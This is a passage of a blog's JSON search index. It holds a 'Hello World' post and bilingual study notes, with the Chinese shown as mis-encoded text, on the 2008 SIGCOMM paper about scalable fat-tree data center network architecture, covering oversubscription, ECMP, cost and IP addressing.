[{"content":"Welcome to AGA\u0026rsquo;s Blog. This is my first post.\nFor more information about this theme, check the documentation: https://stack.jimmycai.com/\n","date":"2023-10-18T17:55:36+08:00","image":"https://anonymity-0.github.io/posts/hello-world/cover_huf17888c423d4998eadaee1ca18c79e46_784100_120x120_fill_q75_box_smart1.jpg","permalink":"https://anonymity-0.github.io/posts/hello-world/","title":"Hello World"},{"content":"A scalable, commodity data center network architecture\nğŸ’¡ Meta Data Title\nA scalable, commodity data center network architecture\nJournal\nACM SIGCOMM Computer Communication Review\nAuthors\nMohammad Al-Fares; Alexander Loukissas; Amin Vahdat\nPub. date\nå…«æœˆ 17, 2008\næœŸåˆŠæ ‡ç­¾\nDOI\n10.1145/1402946.1402967\né™„ä»¶\nAl-Fares et al_2008_A scalable, commodity data center network architecture.pdf\nğŸ“œ ç ”ç©¶èƒŒæ™¯ \u0026amp; åŸºç¡€ \u0026amp; ç›®çš„ â€œClusters consisting of tens of thousands of PCs are not unheard of in the largest â€œinstitutions and thousand-node clusters are increasingly common in universities, research labs, and companies.â€ (Al-Fares ç­‰, 2008, p. 63) å¤§å‹æœºæ„ä¸­ç”±æ•°ä¸‡å°PCç»„æˆçš„é›†ç¾¤å¹¶ä¸å°‘è§ï¼Œåœ¨å¤§å­¦ï¼Œç ”ç©¶å®éªŒå®¤å’Œå…¬å¸ä¸­ï¼ŒåƒèŠ‚ç‚¹é›†ç¾¤è¶Šæ¥è¶Šæ™®éã€‚è¿™äº›é›†ç¾¤ç”¨äºå„ç§ç›®çš„ï¼ŒåŒ…æ‹¬ç§‘å­¦è®¡ç®—ï¼Œæ•°æ®åˆ†æå’Œæœºå™¨å­¦ä¹ ã€‚å®ƒä»¬æä¾›äº†å¤§é‡çš„è®¡ç®—èƒ½åŠ›ï¼Œå¯ç”¨äºè§£å†³å¤æ‚é—®é¢˜ã€‚\nDC Communications M2M communicationsï¼šM2M communicationsï¼Œå³æœºå™¨å¯¹æœºå™¨é€šä¿¡ï¼Œæ˜¯æŒ‡æœºå™¨ä¸æœºå™¨ä¹‹é—´è¿›è¡Œçš„æ•°æ®é€šä¿¡ã€‚M2Mé€šä¿¡çš„ç›®çš„é€šå¸¸æ˜¯å®ç°æœºå™¨ä¹‹é—´çš„è‡ªåŠ¨åŒ–æ§åˆ¶å’Œæ•°æ®äº¤æ¢ã€‚\nâ€œToday, the principle bottleneck in large-scale clusters is often inter-node communication bandwidth.â€ (Al-Fares ç­‰, 2008, p. 63) å¦‚ä»Šï¼Œå¤§è§„æ¨¡é›†ç¾¤çš„ä¸»è¦ç“¶é¢ˆå¾€å¾€æ˜¯èŠ‚ç‚¹é—´çš„é€šä¿¡å¸¦å®½ã€‚\nâ€œFor example, MapReduce [12] must perform significant data shuffling to transport the output of its map phase before proceeding with its reduce phase. Applications running on clusterbased file systems [18, 28, 13, 26] often require remote-node access before proceeding with their I/O operations.â€ (Al-Fares ç­‰, 2008, p. 63) ä¾‹å¦‚ï¼ŒMapReduceå¿…é¡»å…ˆè¿›è¡Œå¤§é‡çš„æ•°æ®é‡ç»„ï¼Œä»¥ä¼ è¾“å…¶æ˜ å°„é˜¶æ®µçš„è¾“å‡ºï¼Œç„¶åå†è¿›å…¥è¿˜åŸé˜¶æ®µã€‚åœ¨åŸºäºé›†ç¾¤çš„æ–‡ä»¶ç³»ç»Ÿä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºåœ¨è¿›è¡Œ I/O æ“ä½œå‰ï¼Œé€šå¸¸éœ€è¦è¿œç¨‹èŠ‚ç‚¹è®¿é—®ã€‚\nâ€œA query to a web search engine often requires parallel communication with every node in the cluster hosting the inverted index to return the most relevant results [7].â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤å¯¹ç½‘ç»œæœç´¢å¼•æ“çš„æŸ¥è¯¢å¾€å¾€éœ€è¦ä¸æ‰¿è½½å€’æ’ç´¢å¼•çš„é›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹è¿›è¡Œå¹¶è¡Œé€šä¿¡ï¼Œä»¥è¿”å›æœ€ç›¸å…³çš„ç»“æœ[7]ã€‚ğŸ”¤\nâ€œInternet services increasingly employ service oriented architectures [13], where the retrieval of a single web page can require coordination and communication with literally hundreds of individual sub-services running on remote nodes.â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤äº’è”ç½‘æœåŠ¡è¶Šæ¥è¶Šå¤šåœ°é‡‡ç”¨é¢å‘æœåŠ¡çš„æ¶æ„[13]ï¼Œåœ¨è¿™ç§æ¶æ„ä¸‹ï¼Œæ£€ç´¢ä¸€ä¸ªç½‘é¡µå¯èƒ½éœ€è¦ä¸è¿œç¨‹èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ•°ç™¾ä¸ªå•ç‹¬çš„å­æœåŠ¡è¿›è¡Œåè°ƒå’Œé€šä¿¡ã€‚ğŸ”¤\nTwo approaches for DC network â€œThere are two high-level choices for building the communication fabric for large-scale clusters.â€\napproach1 â€œOne option leverages specialized hardware and communication protocols, such as InfiniBand [2] or Myrinet [6].â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨ä¸“ç”¨ç¡¬ä»¶å’Œé€šä¿¡åè®®ï¼Œå¦‚ InfiniBand [2] æˆ– Myrinet [6]ã€‚ğŸ”¤\nç¼ºç‚¹ï¼š\nâ€œthey do not leverage commodity parts (and are hence more expensive)â€ (Al-Fares ç­‰, 2008, p. 63)å®ƒä»¬ä¸ä½¿ç”¨é€šç”¨é›¶ä»¶ï¼ˆå› æ­¤æ›´æ˜‚è´µï¼‰\nâ€œnot natively compatible with TCP/IP applications.â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤ä¸ TCP/IP åº”ç”¨ç¨‹åºä¸å…¼å®¹ã€‚ğŸ”¤\napproach2 â€œThe second choice leverages commodity Ethernet switches and routers to interconnect cluster machines.â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤ç¬¬äºŒç§é€‰æ‹©æ˜¯åˆ©ç”¨å•†å“ä»¥å¤ªç½‘äº¤æ¢æœºå’Œè·¯ç”±å™¨å®ç°é›†ç¾¤æœºå™¨ä¹‹é—´çš„äº’è”ã€‚ğŸ”¤\nä¼˜ç‚¹ï¼š\nâ€œThis approach supports a familiar management infrastructure along with unmodified applications, operating systems, and hardware.â€ (Al-Fares ç­‰, 2008, p. 63) ğŸ”¤è¿™ç§æ–¹æ³•æ”¯æŒç†Ÿæ‚‰çš„ç®¡ç†åŸºç¡€è®¾æ–½ä»¥åŠæœªç»ä¿®æ”¹çš„åº”ç”¨ç¨‹åºã€æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ã€‚ğŸ”¤\nDesired Properties for a DC Network Architectureç›´æµç½‘ç»œæ¶æ„çš„ç†æƒ³ç‰¹æ€§ â€œScalable interconnection bandwidth: it should be possible for an arbitrary host in the data center to communicate with any other host in the network at the full bandwidth of its local network interface.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤å¯æ‰©å±•çš„äº’è”å¸¦å®½ï¼šæ•°æ®ä¸­å¿ƒçš„ä»»æ„ä¸€å°ä¸»æœºéƒ½åº”èƒ½ä»¥å…¶æœ¬åœ°ç½‘ç»œæ¥å£çš„å…¨éƒ¨å¸¦å®½ä¸ç½‘ç»œä¸­çš„ä»»ä½•å…¶ä»–ä¸»æœºè¿›è¡Œé€šä¿¡ã€‚ğŸ”¤\nScalable interconnection bandwidth: an arbitrary host can communicate with any other host at the full bandwidth of its local network interface (non-blocking).æ•°æ®ä¸­å¿ƒç½‘ç»œåº”è¯¥èƒ½å¤Ÿæ”¯æŒä»»æ„ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„å…¨å¸¦å®½é€šä¿¡ï¼Œå¹¶ä¸”ä¸ä¼šå‘ç”Ÿé€šä¿¡é˜»å¡ã€‚è¿™å¥è¯æ˜¯æ•°æ®ä¸­å¿ƒç½‘ç»œè®¾è®¡çš„ä¸€ä¸ªé‡è¦ç›®æ ‡ã€‚ â€œEconomies of scale: just as commodity personal computers became the basis for large-scale computing environments, we hope to leverage the same economies of scale to make cheap off-the-shelf Ethernet switches the basis for largescale data center networks.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤è§„æ¨¡ç»æµï¼šæ­£å¦‚å•†å“åŒ–ä¸ªäººç”µè„‘æˆä¸ºå¤§è§„æ¨¡è®¡ç®—ç¯å¢ƒçš„åŸºç¡€ä¸€æ ·ï¼Œæˆ‘ä»¬å¸Œæœ›åˆ©ç”¨åŒæ ·çš„è§„æ¨¡ç»æµï¼Œä½¿å»‰ä»·çš„ç°æˆä»¥å¤ªç½‘äº¤æ¢æœºæˆä¸ºå¤§è§„æ¨¡æ•°æ®ä¸­å¿ƒç½‘ç»œçš„åŸºç¡€ã€‚ğŸ”¤\nEconomies of scale: make cheap off-the-shelf Ethernet switches the basis for large scale data center networks\nè§„æ¨¡ç»æµä½¿å»‰ä»·çš„ç°æˆä»¥å¤ªç½‘äº¤æ¢æœºæˆä¸ºå¤§å‹æ•°æ®ä¸­å¿ƒç½‘ç»œçš„åŸºç¡€\nè¿™å¥è¯çš„æ„æ€æ˜¯ï¼Œç”±äºè§„æ¨¡ç»æµæ•ˆåº”ï¼Œå»‰ä»·çš„ç°æˆä»¥å¤ªç½‘äº¤æ¢æœºåœ¨å¤§å‹æ•°æ®ä¸­å¿ƒç½‘ç»œä¸­å¾—åˆ°äº†å¹¿æ³›åº”ç”¨ã€‚\nè§„æ¨¡ç»æµæ•ˆåº”æ˜¯æŒ‡ä¼ä¸šéšç€ç”Ÿäº§è§„æ¨¡çš„æ‰©å¤§ï¼Œå•ä½äº§å“çš„æˆæœ¬ä¼šé™ä½çš„ç°è±¡ã€‚åœ¨æ•°æ®ä¸­å¿ƒç½‘ç»œä¸­ï¼Œç”±äºå¤§å‹æ•°æ®ä¸­å¿ƒéœ€è¦å¤§é‡çš„ä»¥å¤ªç½‘äº¤æ¢æœºï¼Œå› æ­¤è§„æ¨¡ç»æµæ•ˆåº”å¯ä»¥æ˜¾è‘—é™ä½ä»¥å¤ªç½‘äº¤æ¢æœºçš„æˆæœ¬ã€‚\nâ€œBackward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP. That is, existing data centers, which almost universally leverage commodity Ethernet and run IP, should be able to take advantage of the new interconnect architecture with no modifications.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤å‘åå…¼å®¹æ€§ï¼šæ•´ä¸ªç³»ç»Ÿåº”å‘åå…¼å®¹è¿è¡Œä»¥å¤ªç½‘å’Œ IP çš„ä¸»æœºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡ ä¹æ™®éåˆ©ç”¨å•†å“ä»¥å¤ªç½‘å’Œè¿è¡Œ IP çš„ç°æœ‰æ•°æ®ä¸­å¿ƒåº”èƒ½åˆ©ç”¨æ–°çš„äº’è¿æ¶æ„ï¼Œè€Œæ— éœ€è¿›è¡Œä»»ä½•ä¿®æ”¹ã€‚ğŸ”¤\nBackward compatibility: the entire system should be backward compatible with hosts running Ethernet and IP.\nå‘åå…¼å®¹ï¼šæ•´ä¸ªç³»ç»Ÿåº”ä¸è¿è¡Œä»¥å¤ªç½‘å’Œ IP çš„ä¸»æœºå‘åå…¼å®¹\nè¿™å¥è¯å¼ºè°ƒäº†ç³»ç»Ÿéœ€è¦ä¸ç°æœ‰ä»¥å¤ªç½‘å’Œ IP ç½‘ç»œæ— ç¼é›†æˆçš„é‡è¦æ€§ã€‚è¿™ç¡®ä¿äº†æ–°ä¸»æœºå’Œè®¾å¤‡å¯ä»¥ä¸é—ç•™è®¾å¤‡æ— ç¼é€šä¿¡ï¼Œé˜²æ­¢ä¸­æ–­å¹¶ç¡®ä¿å¹³ç¨³è¿‡æ¸¡åˆ°æ–°ç³»ç»Ÿã€‚\nConventional Data Center Network Topologies ä¼ ç»Ÿæ•°æ®ä¸­å¿ƒç½‘ç»œæ‹“æ‰‘ç»“æ„ (Al-Fares ç­‰, 2008, p. 65)\nâ€œTypical architectures today consist of either two- or three-level trees of switches or routers. A three-tiered design (see Figure 1) has a core tier in the root of the tree, an aggregation tier in the middle and an edge tier at the leaves of the tree.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤ç›®å‰ï¼Œå…¸å‹çš„æ¶æ„ç”±ä¸¤å±‚æˆ–ä¸‰å±‚äº¤æ¢æœºæˆ–è·¯ç”±å™¨æ ‘ç»„æˆã€‚ä¸‰å±‚è®¾è®¡ï¼ˆè§å›¾ 1ï¼‰çš„æ ¸å¿ƒå±‚ä½äºæ ‘çš„æ ¹éƒ¨ï¼Œæ±‡èšå±‚ä½äºæ ‘çš„ä¸­éƒ¨ï¼Œè¾¹ç¼˜å±‚ä½äºæ ‘çš„å¶éƒ¨ã€‚ğŸ”¤\næ ¸å¿ƒå±‚ï¼ˆCore Tierï¼‰: æ ¸å¿ƒå±‚æ˜¯ç½‘ç»œçš„é¡¶å±‚ï¼Œè´Ÿè´£å¤„ç†æ•´ä¸ªæ•°æ®ä¸­å¿ƒå†…çš„é«˜çº§è·¯ç”±å’Œè½¬å‘ã€‚å®ƒé€šå¸¸æ‹¥æœ‰å¤§é‡çš„é«˜é€Ÿè¿æ¥ï¼Œä»¥æ”¯æŒå¤§è§„æ¨¡çš„æ•°æ®ä¼ è¾“ã€‚ èšåˆå±‚ï¼ˆAggregation Tierï¼‰: èšåˆå±‚ä½äºæ ¸å¿ƒå±‚å’Œè¾¹ç¼˜å±‚ä¹‹é—´ï¼Œè´Ÿè´£å°†æ¥è‡ªè¾¹ç¼˜å±‚çš„æµé‡è¿›è¡Œæ±‡æ€»å’Œè½¬å‘ã€‚è¿™ä¸€å±‚çš„å­˜åœ¨æœ‰åŠ©äºæé«˜ç½‘ç»œçš„å¯æ‰©å±•æ€§å’Œæ€§èƒ½ã€‚ è¾¹ç¼˜å±‚ï¼ˆEdge Tierï¼‰: è¾¹ç¼˜å±‚æ˜¯ç½‘ç»œç»“æ„çš„åº•å±‚ï¼Œä½äºæ ‘çš„æœ«ç«¯ï¼Œé€šå¸¸ä¸ç»ˆç«¯è®¾å¤‡ç›´æ¥ç›¸è¿ã€‚å®ƒå¤„ç†ä¸æ•°æ®ä¸­å¿ƒå†…éƒ¨è®¾å¤‡çš„ç›´æ¥é€šä¿¡ï¼Œå¦‚æœåŠ¡å™¨ã€å­˜å‚¨è®¾å¤‡ç­‰ã€‚ â€œWe assume the use of two types of switches, which represent the current high-end in both port density and bandwidth. The first, used at the edge of the tree, is a 48-port GigE switch, with four 10 GigE uplinks. For higher levels of a communication hierarchy, we consider 128-port 10 GigE switches. Both types of switches allow all directly connected hosts to communicate with one another at the full speed of their network interface.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤æˆ‘ä»¬å‡è®¾ä½¿ç”¨ä¸¤ç§ç±»å‹çš„äº¤æ¢æœºï¼Œå®ƒä»¬åœ¨ç«¯å£å¯†åº¦å’Œå¸¦å®½æ–¹é¢éƒ½ä»£è¡¨äº†å½“å‰çš„é«˜ç«¯æ°´å¹³ã€‚ç¬¬ä¸€ç§æ˜¯ç”¨äºæ ‘è¾¹ç¼˜çš„ 48 ç«¯å£åƒå…†ä»¥å¤ªç½‘äº¤æ¢æœºï¼Œå¸¦æœ‰å››ä¸ªä¸‡å…†ä»¥å¤ªç½‘ä¸Šè¡Œé“¾è·¯ã€‚å¯¹äºé€šä¿¡å±‚æ¬¡ç»“æ„çš„è¾ƒé«˜å±‚æ¬¡ï¼Œæˆ‘ä»¬è€ƒè™‘ä½¿ç”¨ 128 ç«¯å£ä¸‡å…†ä»¥å¤ªç½‘äº¤æ¢æœºã€‚è¿™ä¸¤ç§ç±»å‹çš„äº¤æ¢æœºéƒ½å…è®¸æ‰€æœ‰ç›´æ¥è¿æ¥çš„ä¸»æœºä»¥å…¶ç½‘ç»œæ¥å£çš„å…¨é€Ÿç›¸äº’é€šä¿¡ã€‚ğŸ”¤\nTwo types of switches:\n48-port GigE switch, with four 10 GigE uplinks, used at the edge of the tree\nè¿™æ˜¯ä¸€ç§ç”¨äºæ•°æ®ä¸­å¿ƒç½‘ç»œç»“æ„è¾¹ç¼˜çš„äº¤æ¢æœºç±»å‹ã€‚ å…·æœ‰48ä¸ªåƒå…†ä»¥å¤ªç½‘ç«¯å£ï¼Œè¿™äº›ç«¯å£ç”¨äºè¿æ¥ç›´æ¥çš„ç»ˆç«¯è®¾å¤‡ï¼ˆä¸»æœºï¼‰ã€‚ åŒæ—¶ï¼Œå®ƒè¿˜æœ‰å››ä¸ª10åƒå…†ä»¥å¤ªç½‘çš„ä¸Šè¡Œé“¾è·¯ï¼Œè¿æ¥åˆ°æ›´é«˜å±‚æ¬¡çš„ç½‘ç»œç»“æ„ï¼Œç”¨äºä¼ è¾“æ•°æ®åˆ°èšåˆå±‚ã€‚ 128-port 10 GigE switch for higher levels of a communication hierarchy\nè¿™æ˜¯å¦ä¸€ç§ç”¨äºé€šä¿¡å±‚æ¬¡çš„è¾ƒé«˜çº§åˆ«çš„äº¤æ¢æœºç±»å‹ã€‚ å…·æœ‰128ä¸ª10åƒå…†ä»¥å¤ªç½‘ç«¯å£ï¼Œç”¨äºè¿æ¥åˆ°ã€‚æ›´å¤šçš„åº•å±‚äº¤æ¢æœºæˆ–ç›´æ¥è¿æ¥åˆ°è¾¹ç¼˜å±‚çš„ç»ˆç«¯è®¾å¤‡ è¿™ç§äº¤æ¢æœºå…·æœ‰æ›´å¤§çš„ç«¯å£å¯†åº¦å’Œæ›´é«˜çš„å¸¦å®½ï¼Œé€‚ç”¨äºéœ€è¦å¤„ç†æ›´å¤šæ•°æ®æµé‡çš„ç½‘ç»œå±‚æ¬¡ã€‚ æ— è®ºæ˜¯48ç«¯å£çš„åƒå…†ä»¥å¤ªç½‘äº¤æ¢æœºè¿˜æ˜¯128ç«¯å£çš„10åƒå…†ä»¥å¤ªç½‘äº¤æ¢æœºï¼Œå®ƒä»¬éƒ½èƒ½å¤Ÿè®©ç›´æ¥è¿æ¥çš„è®¾å¤‡ä¹‹é—´ä»¥æœ€å¤§é€Ÿåº¦è¿›è¡Œé€šä¿¡ã€‚\nâ€œOversubscriptionâ€ è¿‡åº¦è®¢é˜…æ˜¯ä¸€ç§è®¾è®¡æ•°æ®ä¸­å¿ƒç½‘ç»œçš„ç­–ç•¥ï¼Œç›®çš„æ˜¯é™ä½æ€»ä½“è®¾è®¡æˆæœ¬ã€‚\nâ€œWe define the term oversubscription to be the ratio of the worst-case achievable aggregate bandwidth among the end hosts to the total bisection bandwidth of a particular communication topology.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤æˆ‘ä»¬å°† \u0026ldquo;è¶…é‡è®¢è´­ \u0026ldquo;å®šä¹‰ä¸ºç»ˆç«¯ä¸»æœºä¹‹é—´æœ€åæƒ…å†µä¸‹å¯å®ç°çš„æ€»å¸¦å®½ä¸ç‰¹å®šé€šä¿¡æ‹“æ‰‘çš„æ€»å¸¦å®½ä¹‹æ¯”ã€‚ğŸ”¤\næ–‡ä¸­å®šä¹‰è¿‡åº¦è®¢é˜…ä¸ºç»ˆç«¯ä¸»æœºä¹‹é—´æœ€åæƒ…å†µä¸‹å¯å®ç°çš„æ€»å¸¦å®½ä¸ç‰¹å®šé€šä¿¡æ‹“æ‰‘çš„æ€»å¸¦å®½ä¹‹æ¯”\nâ€œAn oversubscription of 1:1 indicates that all hosts may potentially communicate with arbitrary other hosts at the full bandwidth of their network interface (e.g., 1 Gb/s for commodity Ethernet designs).â€ (Al-Fares ç­‰, 2008, p. 64)\n1:1çš„è¿‡åº¦è®¢é˜…è¡¨ç¤ºæ‰€æœ‰ä¸»æœºå¯ä»¥æ½œåœ¨åœ°ä»¥å®ƒä»¬ç½‘ç»œæ¥å£çš„å®Œæ•´å¸¦å®½è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚ï¼Œå¯¹äºé€šç”¨ä»¥å¤ªç½‘è®¾è®¡ï¼Œå³1 Gb/sã€‚\nâ€œAn oversubscription value of 5:1 means that only 20% of available host bandwidth is available for some communication patterns. Typical designs are oversubscribed by a factor of 2.5:1 (400 Mbps) to 8:1 (125 Mbps) [1].â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤5:1 çš„è¶…é¢è®¢è´­å€¼æ„å‘³ç€åªæœ‰ 20% çš„å¯ç”¨ä¸»æœºå¸¦å®½å¯ç”¨äºæŸäº›é€šä¿¡æ¨¡å¼ã€‚å…¸å‹è®¾è®¡çš„è¶…é¢è®¢è´­ç³»æ•°ä¸º 2.5:1 ï¼ˆ400 Mbpsï¼‰è‡³ 8:1ï¼ˆ125 Mbpsï¼‰[1]ã€‚ğŸ”¤\nè™½ç„¶ 1 Gb/s ä»¥å¤ªç½‘çš„æ•°æ®ä¸­å¿ƒå¯ä»¥å®ç° 1:1 çš„è¶…é‡è®¢é˜…ï¼Œä½†è¿™ç§è®¾è®¡çš„æˆæœ¬é€šå¸¸è¿‡é«˜ã€‚\nMulti-path Routing â€œDelivering full bandwidth between arbitrary hosts in larger clusters requires a â€œmulti-rootedâ€ tree with multiple core switches (see Figure 1).â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤è¦åœ¨å¤§å‹é›†ç¾¤ä¸­çš„ä»»æ„ä¸»æœºä¹‹é—´æä¾›å…¨å¸¦å®½ï¼Œå°±éœ€è¦ä¸€ä¸ªå…·æœ‰å¤šä¸ªæ ¸å¿ƒäº¤æ¢æœºçš„ \u0026ldquo;å¤šæ ¹ \u0026ldquo;æ ‘ï¼ˆè§å›¾ 1ï¼‰ã€‚ğŸ”¤\nMulti-Rooted Tree (å¤šæ ¹æ ‘):\nè¿™è¡¨ç¤ºç½‘ç»œæ‹“æ‰‘ä¸­å­˜åœ¨å¤šä¸ªæ ¸å¿ƒäº¤æ¢æœºï¼Œè¿™äº›äº¤æ¢æœºåœ¨æ ‘çš„æ ¹éƒ¨ï¼Œä»¥æ”¯æŒæ›´å¤šçš„è·¯å¾„é€‰æ‹©ã€‚\nâ€œTo take advantage of multiple paths, ECMP performs static load splitting among flows.â€ (Al-Fares ç­‰, 2008, p. 64) ğŸ”¤ä¸ºäº†åˆ©ç”¨å¤šæ¡è·¯å¾„ï¼ŒECMP åœ¨æµé‡ä¹‹é—´æ‰§è¡Œé™æ€è´Ÿè½½åˆ†æµã€‚ğŸ”¤\nECMP (Equal-Cost Multi-Path):\nECMP æ˜¯ä¸€ç§å¤šè·¯å¾„è·¯ç”±æŠ€æœ¯ï¼Œæ—¨åœ¨å¹³å‡åˆ†æ‹…ç­‰ä»£ä»·è·¯å¾„ä¸Šçš„æµé‡ã€‚\nå®ƒå…è®¸åœ¨å¤šä¸ªç­‰ä»£ä»·è·¯å¾„ä¸Šè¿›è¡Œæµé‡çš„åˆ†å‘ï¼Œä»¥æé«˜ç½‘ç»œçš„åˆ©ç”¨ç‡ã€‚\nECMP çš„å®ç°å¯¹äºè·¯å¾„çš„å¤šæ ·æ€§æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œé€šå¸¸é™åˆ¶åœ¨ 8-16 æ¡è·¯å¾„ä¹‹é—´ã€‚\nè¿™å¯èƒ½ä¸è¶³ä»¥æ»¡è¶³è¾ƒå¤§æ•°æ®ä¸­å¿ƒæ‰€éœ€çš„é«˜äºŒåˆ†å¸¦å®½ï¼Œå› ä¸ºè¿™é™åˆ¶äº†ç½‘ç»œåœ¨ä¸åŒè·¯å¾„ä¸Šè¿›è¡Œæµé‡åˆ†å‘çš„çµæ´»æ€§ã€‚\nä½¿ç”¨ ECMP æ—¶ï¼Œè€ƒè™‘çš„è·¯å¾„æ•°é‡æˆå€å¢åŠ ï¼Œå¯¼è‡´è·¯ç”±è¡¨çš„æ¡ç›®æ•°é‡ä¹Ÿæˆå€å¢åŠ ã€‚\nè¿™ä¼šå¢åŠ ç³»ç»Ÿçš„æˆæœ¬ï¼Œå¹¶å¯èƒ½å¯¼è‡´æŸ¥æ‰¾å»¶è¿Ÿçš„å¢åŠ ã€‚\nCost (Al-Fares ç­‰, 2008, p. 65)\nç»´æŒä¸€ä¸ªå›ºå®šçš„oversubscriptionï¼Œcostä¼šéšè§„æ¨¡æ€¥å‰§å¢åŠ ã€‚\n(Al-Fares ç­‰, 2008, p. 65)\nå¤§å‹é›†ç¾¤ä¸­å®ç°é«˜å¸¦å®½æ°´å¹³çš„ç°æœ‰æŠ€æœ¯ä¼šäº§ç”Ÿæ˜¾è‘—çš„æˆæœ¬ï¼Œè€ŒåŸºäº fat-tree æ¶æ„çš„é›†ç¾¤äº’è¿åœ¨é€‚åº¦çš„æˆæœ¬ä¸‹å…·æœ‰æ˜¾è‘—çš„æ½œåŠ›ã€‚\nä½¿ç”¨æœ€å¤§çš„10åƒå…†ä»¥å¤ªç½‘ï¼ˆ10 GigEï¼‰å’Œé€šç”¨åƒå…†ä»¥å¤ªç½‘ï¼ˆGigEï¼‰äº¤æ¢æœºæ„å»ºå…·æœ‰1:1è¿‡åº¦è®¢é˜…çš„æ•°æ®ä¸­å¿ƒï¼Œä»¥åŠè¯¥é›†ç¾¤æœ€å¤šå¯æ”¯æŒ27,648ä¸ªä¸»æœº\nğŸ“Š ç ”ç©¶å†…å®¹ Fat tree based solution æœ‰kä¸ªpodï¼Œæ¯ä¸ªpodåŒ…å«ä¸¤å±‚k/2ä¸ªäº¤æ¢æœºã€‚è¿™æ ·çš„ç»“æ„ä½¿å¾—ç½‘ç»œå…·æœ‰å±‚æ¬¡åŒ–çš„ç‰¹ç‚¹ã€‚\nåœ¨åº•å±‚ï¼Œæ¯ä¸ªkç«¯å£çš„äº¤æ¢æœºç›´æ¥è¿æ¥åˆ°k/2ä¸ªä¸»æœºã€‚è¿™ç¡®ä¿äº†è¾ƒä½å±‚æ¬¡çš„ç›´æ¥ä¸»æœºè¿æ¥ã€‚\nå‰©ä½™çš„k/2ä¸ªç«¯å£è¿æ¥åˆ°å±‚æ¬¡ç»“æ„ä¸­èšåˆå±‚çš„k/2ä¸ªç«¯å£ã€‚\nåœ¨fattreeæ‹“æ‰‘ä¸­ï¼Œå­˜åœ¨**(k/2)^2**ä¸ªkç«¯å£çš„æ ¸å¿ƒäº¤æ¢æœºã€‚æ¯ä¸ªæ ¸å¿ƒäº¤æ¢æœºæœ‰kä¸ªç«¯å£ï¼Œå…¶ä¸­æ¯ä¸ªç«¯å£è¿æ¥åˆ°kä¸ªpodä¹‹ä¸€ã€‚\nè€ƒè™‘ä¸€ä¸ªfattreeæ‹“æ‰‘ï¼Œå…¶ä¸­æœ‰kä¸ªpodï¼Œæ¯ä¸ªpodæœ‰k/2ä¸ªäº¤æ¢æœºï¼Œæ¯ä¸ªäº¤æ¢æœºæœ‰kä¸ªç«¯å£ã€‚\nä»»æ„ä¸¤ä¸ªä¸»æœºå¯èƒ½ä½äºä¸åŒçš„podï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿æ¥è¿™ä¸¤ä¸ªpodçš„å¤šæ¡è·¯å¾„è¿›è¡Œé€šä¿¡ã€‚å¯¹äºæ¯ä¸ªpodï¼Œå­˜åœ¨(k/2)ä¸ªäº¤æ¢æœºï¼Œå› æ­¤åœ¨æ¯ä¸ªpodå†…ä¹Ÿæœ‰(k/2)æ¡ä¸åŒçš„è·¯å¾„ã€‚å› æ­¤ï¼Œæ€»çš„æœ€çŸ­è·¯å¾„æ•°ä¸º(k/2)Â²ã€‚\næ¯ä¸ªæ ¸å¿ƒäº¤æ¢æœºçš„ç¬¬iä¸ªç«¯å£ä¸ç¬¬iä¸ªpodè¿æ¥ã€‚è¿™æ ·çš„è¿æ¥æ¨¡å¼ç¡®ä¿äº†æ¯ä¸ªpodéƒ½ä¸æ‰€æœ‰æ ¸å¿ƒäº¤æ¢æœºç›´æ¥ç›¸è¿ã€‚\nåœ¨æ¯ä¸ªpodçš„èšåˆå±‚äº¤æ¢æœºä¸Šï¼Œä¸æ ¸å¿ƒäº¤æ¢æœºçš„è¿æ¥æ˜¯ä»¥(k/2)çš„æ­¥å¹…è¿›è¡Œçš„ï¼Œå³ç›¸é‚»çš„èšåˆå±‚ç«¯å£ä¸æ ¸å¿ƒäº¤æ¢æœºçš„è¿æ¥æ˜¯åœ¨(k/2)æ­¥å¹…ä¸Šçš„ã€‚\nåœ¨è¿™ç¯‡è®ºæ–‡ä¸­ï¼Œé‡ç‚¹å…³æ³¨kå€¼æœ€å¤šä¸º48çš„è®¾è®¡ã€‚\nåœ°å€ â€œWe allocate all the IP addresses in the network within the private 10.0.0.0/8 block. We follow the familiar quad-dotted form with the following conditions: The pod switches are given addresses of the form 10.pod.switch.1,wherepod denotes the pod number (in [0,k âˆ’ 1]), and switch denotes the position of that switch in the pod (in [0,kâˆ’1], starting from left to right, bottom to top). We give core switches addresses of the form 10.k.j.i,wherej and i denote that switchâ€™s coordinates in the (k/2)2 core switch grid (each in [1, (k/2)], starting from top-left). The address of a host follows from the pod switch it is connected to; hosts have addresses of the form: 10.pod.switch.ID,where ID is the hostâ€™s position in that subnet (in [2,k/2+1], starting from left to right). Therefore, each lower-level switch is responsible for a /24 subnet of k/2 hosts (for k\u0026lt;256). Figure 3 shows examples of this addressing scheme for a fat-tree corresponding to k =4.Even though this is relatively wasteful use of the available address space, it simplifies building the routing tables, as seen below. Nonetheless, this scheme scales up to 4.2M hosts.â€ (Al-Fares ç­‰, 2008, p. 